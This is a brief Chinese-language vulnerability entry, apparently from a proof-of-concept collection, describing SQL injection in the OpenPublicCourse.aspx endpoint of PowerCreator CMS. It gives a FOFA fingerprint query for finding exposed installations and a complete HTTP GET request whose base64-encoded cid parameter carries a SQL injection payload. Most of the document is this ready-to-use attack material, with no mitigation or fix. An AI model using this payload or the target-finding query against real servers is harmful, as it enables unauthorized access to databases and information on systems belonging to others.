## PowerCreator接口OpenPublicCourse.aspx存在sql注入漏洞

PowerCreator接口 OpenPublicCourse.aspx存在sql注入漏洞。攻击者可利用该漏洞获取服务器上的信息。

## fofa

```yaml
app="PowerCreator-CMS"
```

![image](https://github.com/user-attachments/assets/fcc5c0c8-6a56-42a0-9aba-0d65b1d63a56)

## poc

```yaml
GET /OpenPublicCourse.aspx?cid=NSBhbmQgMT1zeXMuZm5fc3FsdmFyYmFzZXRvc3RyKEhhc2hCeXRlcygnTUQ1JywnMTIzNDU2JykpLS0%3D HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: ASP.NET_SessionId=l2wuj2tri5e554020jeezoyw; language=simpleChineses
Pragma: no-cache
Cache-Control: no-cache


```
